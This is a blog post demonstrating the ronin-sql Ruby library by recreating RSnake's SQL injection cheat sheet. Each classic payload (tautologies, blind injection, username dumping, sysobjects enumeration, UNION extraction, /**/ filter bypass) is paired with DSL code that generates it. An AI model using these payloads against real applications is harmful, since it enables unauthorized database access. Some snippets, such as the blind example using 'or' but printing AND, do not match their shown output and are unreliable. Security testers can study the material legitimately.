---
layout: post
title: RSnakes SQLi Cheat Sheet using ronin-sql 1.1.0
author: postmodern
tags:
 - ronin
 - sqli
 - rsnake
---

After the release of [ronin-sql] 1.0.0, I wondered if we could recreate
[RSnake's SQL Injection Cheat Sheet][1] using the new [Ronin::SQL]
Domain Specific Language (DSL). Let's see how far we can get.

Normal SQL Injection:

{% highlight sql %}
1 OR 1=1
{% endhighlight %}

{% highlight ruby %}
sqli = Ronin::SQL::Injection.new
sqli.or { 1 == 1 }
puts sqli
# => 1 OR 1=1
{% endhighlight %}

Normal SQL Injection using encapsulated data:

{% highlight sql %}
1' OR '1'='1
{% endhighlight %}

{% highlight ruby %}
sqli = Ronin::SQL::Injection.new(escape: :string)
sqli.or { string(1) == string(1) }
puts sqli
# 1' OR '1'='1
{% endhighlight %}

Blind SQL Injection:

{% highlight sql %}
1 AND 1=1
{% endhighlight %}

{% highlight ruby %}
sqli = Ronin::SQL::Injection.new
sqli.or { 1 == 1 }
puts sqli
# 1 AND 1=1
{% endhighlight %}

Blind SQL Injection to attempt to locate `tablename` by brute-force
iteration through table name permutations:

{% highlight sql %}
1' AND 1=(SELECT COUNT(*) FROM tablenames); --
{% endhighlight %}

{% highlight ruby %}
sqli = Ronin::SQL::Injection.new(escape: :string)
sqli.and { select(count).from(:tablenames) == 1 }
puts sqli
# 1 AND (SELECT COUNT(*) FROM tablenames)=1
{% endhighlight %}

Creating errors by calling non-existent tables:

{% highlight sql %}
1' AND non_existant_table = '1
{% endhighlight %}

{% highlight ruby %}
sqli = Ronin::SQL::Injection.new(escape: :string)
sqli.and { non_existant_table == '1' }
puts sqli
# 1' AND non_existant_table='1
{% endhighlight %}

Dumping usernames:

{% highlight sql %}
' OR username IS NOT NULL OR username = '
{% endhighlight %}

{% highlight ruby %}
sqli = Ronin::SQL::Injection.new(escape: :string)
sqli.or { username.is_not(null) }.or { username == '' }
puts sqli
# 1' OR username IS NOT NULL OR username='
{% endhighlight %}

Enumerating through database table names:

{% highlight sql %}
1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'), 1, 1))) > 116
{% endhighlight %}

{% highlight ruby %}
sqli = Ronin::SQL::Injection.new
sqli.and {
  ascii(
    lower(
      substring(
        select(:name).top(1).from(sysobjects).where { xtype == 'U' }, 1, 1
      )
    )
  ) > 116
}
puts sqli
# 1 AND ASCII(LOWER(SUBSTRING((SELECT name TOP 1 FROM sysobjects WHERE xtype='U'),1,1)))>116
{% endhighlight %}

Finding user supplied tables using the `sysObjects` table in SQL Server:

{% highlight sql %}
1 UNION ALL SELECT 1,2,3,4,5,6,name FROM sysObjects WHERE xtype = 'U' --
{% endhighlight %}

{% highlight ruby %}
sqli = Ronin::SQL::Injection.new
sqli.union_all {
  select(1,2,3,4,5,6,name).from(sysObjects).where { xtype == 'U' }
}
puts sqli.to_sql(:terminate => true)
# 1 UNION ALL (SELECT (1,2,3,4,5,6,name) FROM sysObjects WHERE xtype='U');--
{% endhighlight %}

Bypass filters by using `/**/` instead of spaces:

{% highlight sql %}
1/**/UNION/**/SELECT/**/(1,2,3,4,id)/**/FROM/**/users
{% endhighlight %}

{% highlight ruby %}
sqli = Ronin::SQL::Injection.new
sqli.union { select(1,2,3,4,id).from(users) }
puts sqli.to_sql(:space => '/**/')
# 1/**/UNION/**/SELECT/**/(1,2,3,4,id)/**/FROM/**/users
{% endhighlight %}

Not too shabby!

[1]: http://ha.ckers.org/sqlinjection/

[ronin-sql]: https://github.com/ronin-ruby/ronin-sql#readme
[Ronin::SQL]: /docs/ronin-sql/Ronin/SQL.html
